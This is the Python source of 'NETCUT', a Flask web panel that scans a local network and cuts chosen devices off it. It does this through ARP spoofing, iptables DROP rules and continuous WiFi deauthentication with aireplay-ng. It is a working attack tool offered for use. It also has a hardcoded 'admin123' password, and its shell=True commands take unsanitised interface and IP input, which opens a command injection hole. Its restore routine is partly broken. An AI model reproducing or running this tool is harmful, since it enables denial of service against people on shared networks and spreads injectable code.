#!/usr/bin/env python3
import subprocess, threading, os, json, signal, xml.etree.ElementTree as ET
from flask import Flask, request, jsonify, session, redirect, render_template_string
from functools import wraps

app = Flask(__name__)
app.secret_key = os.urandom(24)

PASSWORD = "admin123"  # Change this!

attack_procs = {}
attack_lock = threading.Lock()

HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NETCUT // Control Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #050508;
    --panel: #0a0a10;
    --border: #1a1a2e;
    --accent: #00ff88;
    --accent2: #ff3366;
    --accent3: #00aaff;
    --dim: #2a2a3e;
    --text: #c8d0e0;
    --muted: #556;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Share Tech Mono', monospace;
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* Scanline overlay */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,255,136,0.015) 2px,
      rgba(0,255,136,0.015) 4px
    );
    pointer-events: none;
    z-index: 1000;
  }

  /* Grid background */
  body::after {
    content: '';
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  .wrap { position: relative; z-index: 1; max-width: 1100px; margin: 0 auto; padding: 2rem; }

  header {
    border-bottom: 1px solid var(--border);
    padding-bottom: 1.5rem;
    margin-bottom: 2rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }

  .logo {
    font-family: 'Orbitron', sans-serif;
    font-weight: 900;
    font-size: 1.8rem;
    letter-spacing: 0.15em;
    color: var(--accent);
    text-shadow: 0 0 20px rgba(0,255,136,0.5), 0 0 60px rgba(0,255,136,0.2);
  }

  .logo span { color: var(--accent2); }

  .status-bar {
    font-size: 0.75rem;
    color: var(--muted);
    text-align: right;
    line-height: 1.8;
  }

  .status-bar .dot {
    display: inline-block;
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--accent);
    box-shadow: 0 0 8px var(--accent);
    margin-right: 6px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
  }

  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }

  .panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 1.5rem;
    position: relative;
    overflow: hidden;
  }

  .panel::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 1px;
    background: linear-gradient(90deg, transparent, var(--accent), transparent);
    opacity: 0.5;
  }

  .panel-title {
    font-family: 'Orbitron', sans-serif;
    font-size: 0.7rem;
    letter-spacing: 0.2em;
    color: var(--accent);
    margin-bottom: 1.2rem;
    text-transform: uppercase;
  }

  label { display: block; font-size: 0.75rem; color: var(--muted); margin-bottom: 0.4rem; letter-spacing: 0.1em; }

  input[type=text], input[type=password], select {
    width: 100%;
    background: #050508;
    border: 1px solid var(--dim);
    border-radius: 3px;
    color: var(--accent);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    padding: 0.6rem 0.8rem;
    margin-bottom: 1rem;
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
  }

  input:focus, select:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 1px rgba(0,255,136,0.2), inset 0 0 10px rgba(0,255,136,0.05);
  }

  select option { background: #0a0a10; color: var(--accent); }

  .btn {
    display: inline-block;
    font-family: 'Orbitron', sans-serif;
    font-size: 0.72rem;
    font-weight: 700;
    letter-spacing: 0.15em;
    padding: 0.7rem 1.4rem;
    border: none;
    border-radius: 3px;
    cursor: pointer;
    transition: all 0.2s;
    text-transform: uppercase;
  }

  .btn-primary {
    background: var(--accent);
    color: #050508;
    box-shadow: 0 0 20px rgba(0,255,136,0.3);
  }

  .btn-primary:hover {
    box-shadow: 0 0 30px rgba(0,255,136,0.6);
    transform: translateY(-1px);
  }

  .btn-danger {
    background: var(--accent2);
    color: #fff;
    box-shadow: 0 0 20px rgba(255,51,102,0.3);
  }

  .btn-danger:hover {
    box-shadow: 0 0 30px rgba(255,51,102,0.6);
    transform: translateY(-1px);
  }

  .btn-secondary {
    background: transparent;
    color: var(--accent3);
    border: 1px solid var(--accent3);
  }

  .btn-secondary:hover {
    background: rgba(0,170,255,0.1);
    box-shadow: 0 0 20px rgba(0,170,255,0.2);
  }

  .btn-full { width: 100%; text-align: center; }
  .btn + .btn { margin-top: 0.6rem; }

  #device-list { list-style: none; }

  #device-list li {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.6rem 0.8rem;
    border: 1px solid var(--dim);
    border-radius: 3px;
    margin-bottom: 0.5rem;
    cursor: pointer;
    transition: all 0.15s;
    font-size: 0.85rem;
  }

  #device-list li:hover { border-color: var(--accent); background: rgba(0,255,136,0.05); }
  #device-list li.selected { border-color: var(--accent); background: rgba(0,255,136,0.08); color: var(--accent); }

  .device-ip { color: var(--accent3); font-size: 0.85rem; font-weight: bold; }
  .device-hostname { color: var(--text); font-size: 0.78rem; margin-top: 1px; }
  .device-mac { color: var(--muted); font-size: 0.68rem; margin-top: 2px; letter-spacing: 0.05em; }
  .device-vendor { color: var(--accent); font-size: 0.65rem; margin-top: 1px; opacity: 0.7; }

  .attack-panel { grid-column: span 2; }

  #targets-active { list-style: none; }

  #targets-active li {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.7rem 1rem;
    border: 1px solid rgba(255,51,102,0.3);
    border-radius: 3px;
    margin-bottom: 0.5rem;
    background: rgba(255,51,102,0.05);
    font-size: 0.85rem;
    animation: slideIn 0.3s ease;
  }

  @keyframes slideIn {
    from { opacity: 0; transform: translateX(-10px); }
    to { opacity: 1; transform: translateX(0); }
  }

  .target-ip { color: var(--accent2); }

  .kill-btn {
    font-family: 'Orbitron', sans-serif;
    font-size: 0.65rem;
    letter-spacing: 0.1em;
    padding: 0.3rem 0.7rem;
    background: rgba(255,51,102,0.15);
    border: 1px solid var(--accent2);
    color: var(--accent2);
    border-radius: 2px;
    cursor: pointer;
    transition: all 0.2s;
  }

  .kill-btn:hover { background: var(--accent2); color: #fff; }

  #log {
    background: #020203;
    border: 1px solid var(--dim);
    border-radius: 3px;
    padding: 1rem;
    height: 160px;
    overflow-y: auto;
    font-size: 0.78rem;
    line-height: 1.7;
    color: var(--muted);
  }

  #log .log-ok { color: var(--accent); }
  #log .log-err { color: var(--accent2); }
  #log .log-info { color: var(--accent3); }

  .iface-row { display: flex; gap: 0.8rem; }
  .iface-row input { flex: 1; }

  /* Login page */
  .login-wrap {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    z-index: 1;
  }

  .login-box {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 4px;
    padding: 3rem 2.5rem;
    width: 360px;
    position: relative;
    overflow: hidden;
  }

  .login-box::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 2px;
    background: linear-gradient(90deg, transparent, var(--accent), transparent);
  }

  .login-title {
    font-family: 'Orbitron', sans-serif;
    font-weight: 900;
    font-size: 1.5rem;
    color: var(--accent);
    text-shadow: 0 0 20px rgba(0,255,136,0.4);
    margin-bottom: 0.4rem;
    letter-spacing: 0.1em;
  }

  .login-sub { color: var(--muted); font-size: 0.75rem; margin-bottom: 2rem; letter-spacing: 0.1em; }

  .empty-state { color: var(--muted); font-size: 0.8rem; padding: 1rem 0; text-align: center; }

  .flex-row { display: flex; gap: 0.6rem; }
  .flex-row .btn { flex: 1; }

  #gateway-display {
    font-size: 0.8rem;
    color: var(--accent3);
    margin-bottom: 1rem;
    padding: 0.5rem 0.8rem;
    border: 1px solid var(--dim);
    border-radius: 3px;
    background: #020203;
  }
</style>
</head>
<body>
{% if not logged_in %}
<div class="login-wrap">
  <div class="login-box">
    <div class="login-title">NETCUT</div>
    <div class="login-sub">// AUTHORIZED ACCESS ONLY</div>
    {% if error %}<div style="color:var(--accent2);font-size:0.8rem;margin-bottom:1rem;">{{ error }}</div>{% endif %}
    <label>ACCESS CODE</label>
    <form method="POST" action="/login">
      <input type="password" name="password" placeholder="enter password..." autofocus>
      <button type="submit" class="btn btn-primary btn-full">AUTHENTICATE</button>
    </form>
  </div>
</div>
{% else %}
<div class="wrap">
  <header>
    <div class="logo">NET<span>CUT</span> //</div>
    <div class="status-bar">
      <div><span class="dot"></span>SYSTEM ONLINE</div>
      <div style="margin-top:4px;">
        <a href="/logout" style="color:var(--muted);text-decoration:none;font-size:0.7rem;letter-spacing:0.1em;">[ LOGOUT ]</a>
      </div>
    </div>
  </header>

  <div class="grid">

    <!-- Interface Panel -->
    <div class="panel">
      <div class="panel-title">// Network Interface</div>
      <label>LAN INTERFACE (for scan + ARP)</label>
      <div class="iface-row">
        <input type="text" id="iface" placeholder="eth0 / wlan0" value="eth0">
        <button class="btn btn-secondary" onclick="scanNetwork()">SCAN</button>
      </div>
      <label>WIFI INTERFACE (for deauth, optional)</label>
      <div class="iface-row" style="margin-bottom:0;">
        <input type="text" id="wifi-iface" placeholder="wlan0 / wlan1 (monitor mode)" value="">
      </div>
      <div style="color:var(--muted);font-size:0.68rem;margin-top:0.3rem;margin-bottom:1rem;">leave blank to skip deauth — needed for phones/IoT</div>
      <div id="gateway-display">GATEWAY: —</div>
      <div id="scan-status" style="color:var(--muted);font-size:0.75rem;"></div>
    </div>

    <!-- Discovered Devices -->
    <div class="panel">
      <div class="panel-title">// Discovered Hosts</div>
      <ul id="device-list">
        <li class="empty-state">[ run scan to discover hosts ]</li>
      </ul>
    </div>

    <!-- Attack Panel -->
    <div class="panel attack-panel">
      <div class="panel-title">// Attack Control</div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;">
        <div>
          <label>SELECTED TARGET</label>
          <input type="text" id="target-ip" placeholder="x.x.x.x (or type manually)">
          <div class="flex-row">
            <button class="btn btn-danger" onclick="startAttack()">CUT TARGET</button>
            <button class="btn btn-secondary" onclick="restoreAll()">RESTORE ALL</button>
          </div>
        </div>
        <div>
          <label>ACTIVE TARGETS</label>
          <ul id="targets-active">
            <li class="empty-state">[ no active attacks ]</li>
          </ul>
        </div>
      </div>
      <div style="margin-top:1.2rem;">
        <label>SYSTEM LOG</label>
        <div id="log"><span class="log-info">// netcut ready. scan network to begin.</span></div>
      </div>
    </div>

  </div>
</div>

<script>
let gateway = '';
let activeTargets = {};

function log(msg, type='info') {
  const el = document.getElementById('log');
  const ts = new Date().toTimeString().slice(0,8);
  el.innerHTML += `<div class="log-${type}">[${ts}] ${msg}</div>`;
  el.scrollTop = el.scrollHeight;
}

let hostMap = {};  // ip -> host info

async function scanNetwork() {
  const iface = document.getElementById('iface').value.trim();
  if (!iface) return log('no interface specified', 'err');
  log(`scanning on ${iface}...`, 'info');
  document.getElementById('scan-status').textContent = 'scanning...';

  const res = await fetch('/scan', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({iface})
  });
  const data = await res.json();

  if (data.error) { log(data.error, 'err'); return; }

  gateway = data.gateway;
  document.getElementById('gateway-display').textContent = `GATEWAY: ${data.gateway}  |  HOSTS: ${data.hosts.length}`;
  document.getElementById('scan-status').textContent = `${data.hosts.length} host(s) found`;

  const list = document.getElementById('device-list');
  if (data.hosts.length === 0) {
    list.innerHTML = '<li class="empty-state">[ no hosts found ]</li>';
    return;
  }

  data.hosts.forEach(h => { hostMap[h.ip] = h; });
  list.innerHTML = data.hosts.map(h => `
    <li onclick="selectTarget('${h.ip}')">
      <div style="flex:1;min-width:0;">
        <div class="device-ip">${h.ip}</div>
        <div class="device-hostname">${h.hostname || '<span style=\"color:var(--muted)\">unknown host</span>'}</div>
        <div class="device-mac">${h.mac || 'no mac'}</div>
        ${h.vendor ? `<div class="device-vendor">&#9670; ${h.vendor}</div>` : ''}
      </div>
      <span style="color:var(--muted);font-size:0.7rem;margin-left:0.5rem;flex-shrink:0;">SELECT</span>
    </li>
  `).join('');

  log(`scan complete — ${data.hosts.length} host(s) found, gateway: ${gateway}`, 'ok');
}

function selectTarget(ip) {
  document.getElementById('target-ip').value = ip;
  document.querySelectorAll('#device-list li').forEach(li => {
    li.classList.toggle('selected', li.querySelector('.device-ip')?.textContent === ip);
  });
}

async function startAttack() {
  const iface = document.getElementById('iface').value.trim();
  const wifi_iface = document.getElementById('wifi-iface').value.trim();
  const target = document.getElementById('target-ip').value.trim();
  if (!target) return log('no target specified', 'err');
  if (!gateway) return log('no gateway — run a scan first', 'err');
  if (activeTargets[target]) return log(`${target} already targeted`, 'err');

  const host = hostMap[target] || {};
  log(`cutting internet for ${target}${host.hostname ? ' ('+host.hostname+')' : ''}...`, 'info');

  const res = await fetch('/attack', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({iface, wifi_iface, target, gateway, mac: host.mac || ''})
  });
  const data = await res.json();

  if (data.error) { log(data.error, 'err'); return; }

  data.methods.forEach(m => log(`  method active: ${m}`, 'ok'));
  activeTargets[target] = true;
  log(`TARGET DOWN: ${target} is now cut off`, 'ok');
  renderTargets();
}

async function stopAttack(target) {
  // Update UI immediately - don't wait for server cleanup to finish
  delete activeTargets[target];
  log(`restoring ${target}...`, 'info');
  renderTargets();

  // Mark device as "restoring" in host list
  document.querySelectorAll('#device-list li').forEach(li => {
    if (li.querySelector('.device-ip')?.textContent === target) {
      li.style.opacity = '0.5';
      li.style.pointerEvents = 'none';
    }
  });

  try {
    const res = await fetch('/stop', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({target})
    });
    const data = await res.json();
    if (data.error) {
      log(`restore error for ${target}: ${data.error}`, 'err');
    } else {
      log(`✓ ${target} fully restored`, 'ok');
    }
  } catch (e) {
    log(`restore request failed: ${e}`, 'err');
  }

  // Re-enable device in host list
  document.querySelectorAll('#device-list li').forEach(li => {
    if (li.querySelector('.device-ip')?.textContent === target) {
      li.style.opacity = '1';
      li.style.pointerEvents = '';
    }
  });
}

async function restoreAll() {
  log('restoring all targets...', 'info');
  activeTargets = {};
  renderTargets();
  // Dim all device list items while restoring
  document.querySelectorAll('#device-list li').forEach(li => {
    li.style.opacity = '0.5';
    li.style.pointerEvents = 'none';
  });
  try {
    await fetch('/stop-all', { method: 'POST' });
    log('✓ all targets fully restored', 'ok');
  } catch(e) {
    log(`restore-all request failed: ${e}`, 'err');
  }
  document.querySelectorAll('#device-list li').forEach(li => {
    li.style.opacity = '1';
    li.style.pointerEvents = '';
  });
}

function renderTargets() {
  const list = document.getElementById('targets-active');
  const keys = Object.keys(activeTargets);
  if (keys.length === 0) {
    list.innerHTML = '<li class="empty-state">[ no active attacks ]</li>';
    return;
  }
  list.innerHTML = keys.map(ip => {
    const h = hostMap[ip] || {};
    return `<li>
      <div>
        <span class="target-ip">⬤ ${ip}</span>
        ${h.hostname ? `<div style="color:var(--muted);font-size:0.7rem;">${h.hostname}</div>` : ''}
      </div>
      <button class="kill-btn" onclick="stopAttack('${ip}')">RESTORE</button>
    </li>`;
  }).join('');
}
</script>
{% endif %}
</body>
</html>'''

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect('/')
        return f(*args, **kwargs)
    return decorated

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML, logged_in=session.get('logged_in'), error=None)

@app.route('/login', methods=['POST'])
def login():
    if request.form.get('password') == PASSWORD:
        session['logged_in'] = True
        return redirect('/')
    return render_template_string(HTML, logged_in=False, error='invalid access code')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/scan', methods=['POST'])
@login_required
def scan():
    data = request.get_json()
    iface = data.get('iface', 'eth0')
    try:
        gw_result = subprocess.check_output(
            "ip route show | grep default | awk '{print $3}'", shell=True
        ).decode().strip()
        subnet = subprocess.check_output(
            f"ip -o -f inet addr show {iface} | awk '{{print $4}}'", shell=True
        ).decode().strip()
        if not subnet:
            return jsonify({'error': f'no IP found on {iface}'})

        # -sn = ping scan only (fast, no ports), --resolve-all for DNS, -oX = structured XML
        xml_out = subprocess.check_output(
            f"nmap -sn --resolve-all -oX - {subnet} 2>/dev/null", shell=True
        ).decode()

        hosts = []
        try:
            root = ET.fromstring(xml_out)
            for host in root.findall('host'):
                status = host.find('status')
                if status is None or status.get('state') != 'up':
                    continue
                ip, mac, hostname, vendor = '', '', '', ''
                for addr in host.findall('address'):
                    if addr.get('addrtype') == 'ipv4':
                        ip = addr.get('addr', '')
                    elif addr.get('addrtype') == 'mac':
                        mac = addr.get('addr', '')
                        vendor = addr.get('vendor', '')
                hostnames_el = host.find('hostnames')
                if hostnames_el is not None:
                    for hn in hostnames_el.findall('hostname'):
                        hostname = hn.get('name', '')
                        break
                if ip and ip != gw_result:
                    hosts.append({'ip': ip, 'mac': mac, 'vendor': vendor, 'hostname': hostname})
        except ET.ParseError:
            pass

        return jsonify({'gateway': gw_result, 'hosts': hosts})
    except Exception as e:
        return jsonify({'error': str(e)})

def _get_ap_mac(wifi_iface):
    """Get the BSSID of the AP the wifi interface is connected to."""
    try:
        out = subprocess.check_output(
            f"iw dev {wifi_iface} link 2>/dev/null | grep 'Connected to' | awk '{{print $3}}'",
            shell=True
        ).decode().strip()
        return out if out else ''
    except:
        return ''

def _deauth_loop(wifi_iface, target_mac, ap_mac, stop_event):
    """Continuously send deauth frames until stop_event is set."""
    while not stop_event.is_set():
        try:
            subprocess.run(
                ['aireplay-ng', '--deauth', '5', '-a', ap_mac, '-c', target_mac, wifi_iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10
            )
        except:
            pass
        stop_event.wait(2)

@app.route('/attack', methods=['POST'])
@login_required
def attack():
    data = request.get_json()
    iface      = data.get('iface', 'eth0')
    wifi_iface = data.get('wifi_iface', '').strip()
    target     = data.get('target')
    gateway    = data.get('gateway')
    mac        = data.get('mac', '').strip()

    if not target or not gateway:
        return jsonify({'error': 'missing target or gateway'})

    with attack_lock:
        if target in attack_procs:
            return jsonify({'error': 'already attacking this target'})
        try:
            methods = []
            procs   = {'arp': [], 'deauth_thread': None, 'deauth_stop': None,
                       'iface': iface, 'wifi_iface': wifi_iface, 'gateway': gateway, 'mac': mac}

            # ── Method 1: ARP spoof + iptables DROP (works on most devices) ──
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
            subprocess.run(['iptables', '-P', 'FORWARD', 'ACCEPT'], capture_output=True)
            subprocess.run(['iptables', '-I', 'FORWARD', '1', '-s', target, '-j', 'DROP'], capture_output=True)
            subprocess.run(['iptables', '-I', 'FORWARD', '1', '-d', target, '-j', 'DROP'], capture_output=True)
            p1 = subprocess.Popen(
                ['arpspoof', '-i', iface, '-t', target, gateway],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            p2 = subprocess.Popen(
                ['arpspoof', '-i', iface, '-t', gateway, target],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            procs['arp'] = [p1, p2]
            methods.append('arp-spoof + iptables DROP')

            # ── Method 2: MAC-based iptables block (works even if ARP spoof fails) ──
            if mac:
                subprocess.run(
                    ['iptables', '-I', 'FORWARD', '1', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                    capture_output=True
                )
                methods.append(f'mac-block ({mac})')

            # ── Method 3: WiFi deauth (kicks phones/IoT off WiFi entirely) ──
            if wifi_iface and mac:
                ap_mac = _get_ap_mac(wifi_iface)
                if not ap_mac:
                    # Try to get AP mac from scan results via iw
                    try:
                        ap_mac = subprocess.check_output(
                            f"iw dev {wifi_iface} scan 2>/dev/null | grep -A5 'DS Parameter' | head -1 | awk '{{print $2}}'",
                            shell=True
                        ).decode().strip()
                    except:
                        pass
                if ap_mac:
                    stop_event = threading.Event()
                    t = threading.Thread(
                        target=_deauth_loop,
                        args=(wifi_iface, mac, ap_mac, stop_event),
                        daemon=True
                    )
                    t.start()
                    procs['deauth_thread'] = t
                    procs['deauth_stop']   = stop_event
                    methods.append(f'wifi-deauth ({mac} from {ap_mac})')
                else:
                    methods.append('wifi-deauth skipped (AP MAC not found)')

            attack_procs[target] = procs
            return jsonify({'ok': True, 'methods': methods})
        except Exception as e:
            return jsonify({'error': str(e)})

@app.route('/stop', methods=['POST'])
@login_required
def stop():
    data = request.get_json()
    target = data.get('target')
    # Respond immediately, run cleanup in background so UI isn't blocked
    t = threading.Thread(target=_stop_target, args=(target,), daemon=True)
    t.start()
    return jsonify({'ok': True})

@app.route('/stop-all', methods=['POST'])
@login_required
def stop_all():
    targets = list(attack_procs.keys())
    for target in targets:
        t = threading.Thread(target=_stop_target, args=(target,), daemon=True)
        t.start()
    return jsonify({'ok': True})

@app.route('/debug', methods=['GET'])
@login_required
def debug():
    try:
        fwd = subprocess.check_output('cat /proc/sys/net/ipv4/ip_forward', shell=True).decode().strip()
        ipt = subprocess.check_output('iptables -L FORWARD -n --line-numbers 2>/dev/null', shell=True).decode().strip()
        arp = subprocess.check_output('arp -n 2>/dev/null', shell=True).decode().strip()
        active = list(attack_procs.keys())
        return jsonify({'ip_forward': fwd, 'iptables_forward': ipt, 'arp_table': arp, 'active_attacks': active})
    except Exception as e:
        return jsonify({'error': str(e)})

def _stop_target(target):
    with attack_lock:
        if target not in attack_procs:
            return
        procs = attack_procs.pop(target)

        # Stop deauth thread
        if procs.get('deauth_stop'):
            procs['deauth_stop'].set()

        # Kill arpspoof processes
        for p in procs.get('arp', []):
            try: p.terminate()
            except: pass

        iface = procs.get('iface', 'eth0')
        mac   = procs.get('mac', '')

        # Remove IP-based DROP rules
#        subprocess.run(['iptables', '-D', 'FORWARD, '-s', target, '-j', 'DROP'], capture_output=True)
        subprocess.run(['iptables', '-D', 'FORWARD', '-d', target, '-j', 'DROP'], capture_output=True)

        # Remove MAC-based DROP rule
        if mac:
            subprocess.run(
                ['iptables', '-D', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                capture_output=True
            )

        # Gratuitous ARP to help target recover faster
        subprocess.run(
            f"arping -c 4 -A -I {iface} {target} 2>/dev/null || true",
            shell=True, capture_output=True
        )

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[-] Must be run as root")
        exit(1)
    print("[+] NETCUT server starting on http://0.0.0.0:8080")
    print(f"[+] Password: {PASSWORD}")
    print("[+] Press Ctrl+C to stop")
    app.run(host='0.0.0.0', port=8080, debug=False)
